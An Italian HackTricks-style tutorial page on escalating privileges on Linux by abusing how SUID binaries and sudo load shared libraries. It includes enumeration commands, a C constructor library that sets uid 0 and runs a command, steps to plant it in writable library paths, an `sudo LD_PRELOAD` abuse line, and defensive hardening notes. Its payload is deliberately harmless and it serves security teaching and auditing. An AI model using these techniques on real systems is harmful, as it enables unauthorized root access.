# Abuso delle librerie condivise SUID e del linker

{{#include ../../banners/hacktricks-training.md}}

I binari SUID vengono solitamente analizzati alla ricerca di esecuzioni dirette di comandi, ma i programmi SUID personalizzati possono essere vulnerabili anche tramite il dynamic linker. Il tema comune è semplice: un executable privilegiato carica codice da un percorso o da una configurazione che un utente con privilegi inferiori può influenzare.

Questa pagina si concentra sui pattern generici delle tecniche: librerie mancanti, directory delle librerie scrivibili, `RPATH`/`RUNPATH`, `LD_PRELOAD` tramite sudo, configurazione del linker e confusione relativa agli hardlink SUID.

## Enumerazione rapida

Inizia cercando file SUID insoliti e verificando se sono collegati dinamicamente:
```bash
find / -perm -4000 -type f -ls 2>/dev/null
file /path/to/suid-binary
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
```
Concentrati su percorsi non standard, percorsi di applicazioni personalizzati, binari di proprietà di root ma al di fuori delle directory gestite dai pacchetti e dipendenze caricate da directory scrivibili.

Verifiche utili della scrivibilità:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
find / -writable -type d 2>/dev/null | head -n 50
```
## Missing Shared Object Injection

Alcuni binari SUID personalizzati tentano di caricare un shared object che non esiste. Se il percorso mancante si trova in una directory controllata dall'attacker, il binario potrebbe caricare codice fornito dall'attacker con l'utente effettivo.

Trova i tentativi di caricamento delle librerie non riusciti:
```bash
strace -f -e trace=openat,access /path/to/suid-binary 2>&1 | grep -Ei 'ENOENT|\\.so'
```
Se il binario cerca `libexample.so` in un percorso scrivibile, una libreria dimostrativa minimale può usare un `constructor`. Mantieni innocua la dimostrazione dell'impatto durante la validazione:
```c
#include <stdlib.h>
#include <unistd.h>

__attribute__((constructor))
static void init(void) {
setuid(0);
setgid(0);
system("id > /tmp/suid-so-ran");
}
```
Compilalo usando il nome file esatto che il binary tenta di caricare:
```bash
gcc -shared -fPIC proof.c -o /writable/path/libexample.so
/path/to/suid-binary
cat /tmp/suid-so-ran
```
La condizione sfruttabile non è la sola mancanza della libreria. L'attaccante deve poter inserire un shared object compatibile in un percorso che il loader privilegiato accetterà.

## Directory della libreria scrivibile

A volte tutte le dipendenze esistono, ma una delle directory utilizzate per risolverle è scrivibile. Ciò può consentire di sostituire una libreria caricata o di inserire una libreria con priorità più alta avente lo stesso nome.

Esaminare i percorsi delle dipendenze:
```bash
ldd /path/to/suid-binary 2>/dev/null
readelf -d /path/to/suid-binary 2>/dev/null | egrep 'NEEDED|RPATH|RUNPATH'
namei -om /path/to/library.so
```
Se la directory è scrivibile, esegui la verifica con un approccio sicuro per le copie in un lab. Sostituire le librerie di sistema su un host attivo può compromettere l'autenticazione, la gestione dei pacchetti o i servizi critici per l'avvio.

## RPATH e RUNPATH

`RPATH` e `RUNPATH` sono voci della sezione dinamica che indicano al loader dove cercare le librerie. Sono pericolose nei programmi SUID quando puntano a directory scrivibili dall'attacker.

Rilevale:
```bash
readelf -d /path/to/suid-binary | egrep 'RPATH|RUNPATH'
objdump -p /path/to/suid-binary 2>/dev/null | egrep 'RPATH|RUNPATH'
```
Esempio di output rischioso:
```text
0x000000000000001d (RUNPATH)            Library runpath: [/opt/app/lib]
0x0000000000000001 (NEEDED)             Shared library: [libcustom.so]
```
Se `/opt/app/lib` è scrivibile e il binario necessita di `libcustom.so`, l'attaccante potrebbe essere in grado di collocare lì una versione malevola di `libcustom.so`:
```bash
ls -ld /opt/app/lib
gcc -shared -fPIC proof.c -o /opt/app/lib/libcustom.so
/path/to/suid-binary
```
`RPATH` e `RUNPATH` non sono identici in tutti i dettagli di risoluzione, ma per la revisione della privilege escalation la domanda pratica è la stessa: il binario SUID cerca una directory scrivibile dall'attaccante per il nome di una library?

## LD_PRELOAD, LD_LIBRARY_PATH e SUID

Per i programmi normali, `LD_PRELOAD` e `LD_LIBRARY_PATH` possono forzare o influenzare il caricamento degli shared object. Per i programmi SUID, il dynamic loader normalmente entra in secure-execution mode e ignora le variabili d'ambiente pericolose.

Ciò significa che un semplice binario SUID di solito non è vulnerabile solo perché l'utente può impostare `LD_PRELOAD`:
```bash
LD_PRELOAD=/tmp/proof.so /path/to/suid-binary
```
L’eccezione comune è una configurazione errata di `sudo`. Se `sudo -l` mostra che una variabile come `LD_PRELOAD` o `LD_LIBRARY_PATH` viene preservata, un comando consentito da sudo può caricare codice controllato dall’attaccante:
```bash
sudo -l
# Look for env_keep+=LD_PRELOAD or env_keep+=LD_LIBRARY_PATH
sudo LD_PRELOAD=/tmp/proof.so /allowed/command
```
Non confondere questi casi:

- `LD_PRELOAD` contro un normale binario SUID: generalmente bloccato dalla secure execution.
- `LD_PRELOAD` mantenuto da sudo: potenzialmente sfruttabile.
- `.so` mancante in un path scrivibile: sfruttabile quando il binario SUID carica naturalmente quel path.
- `RPATH`/`RUNPATH` verso una directory scrivibile: sfruttabile quando è possibile controllare una libreria necessaria.
- Accesso in scrittura a `/etc/ld.so.preload` o alla configurazione del linker: impatto a livello di sistema e elevato.

## Configurazione del Linker

Il dynamic linker legge anche la configurazione di sistema, come `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, la cache del linker e, in alcuni casi, `/etc/ld.so.preload`.

Verifiche ad alto valore:
```bash
ls -l /etc/ld.so.preload /etc/ld.so.conf 2>/dev/null
find /etc/ld.so.conf.d -type f -writable -ls 2>/dev/null
find /etc/ld.so.conf.d -type d -writable -ls 2>/dev/null
ldconfig -v 2>/dev/null | head -n 50
```
Una configurazione del linker scrivibile è generalmente più grave di un singolo binario SUID vulnerabile, perché può influire su molti processi collegati dinamicamente. `/etc/ld.so.preload` è particolarmente pericoloso perché può forzare il caricamento di un shared object nei processi privilegiati.

## Confusione degli Hardlink SUID

Gli hardlink possono far apparire lo stesso inode SUID con più nomi. Questo è utile per nascondere un helper privilegiato, confondere le operazioni di pulizia o aggirare una verifica ingenua basata sui percorsi.

Trova i file SUID con più di un link:
```bash
find / -xdev -perm -4000 -type f -links +1 -ls 2>/dev/null
```
Esamina tutti i percorsi che puntano allo stesso inode:
```bash
stat /path/to/suid-wrapper
find / -xdev -samefile /path/to/suid-wrapper -ls 2>/dev/null
```
L'abuso non consiste nel fatto che un hardlink modifichi i permessi. L'abuso è la path confusion: un inode privilegiato può essere raggiungibile tramite un nome che i defender o gli script non si aspettano. Per approfondire il workflow relativo a inode e hardlink, consulta [Filesystem, Inodes and Recovery](../main-system-information/filesystem-inodes-and-recovery.md).

## Note difensive

- Mantieni i binari SUID ridotti al minimo, sottoposti ad audit e, ove possibile, gestiti tramite pacchetti.
- Evita voci `RPATH`/`RUNPATH` che puntano a directory scrivibili o gestite dalle applicazioni.
- Mantieni le directory delle librerie di proprietà di root e non scrivibili dagli utenti normali.
- Non conservare `LD_PRELOAD`, `LD_LIBRARY_PATH` o variabili simili del loader attraverso sudo.
- Monitora `/etc/ld.so.preload`, `/etc/ld.so.conf`, `/etc/ld.so.conf.d/` e i file SUID imprevisti.
- Esamina i file SUID collegati tramite hardlink e analizza i wrapper SUID personalizzati al di fuori dei percorsi di sistema standard.

{{#include ../../banners/hacktricks-training.md}}
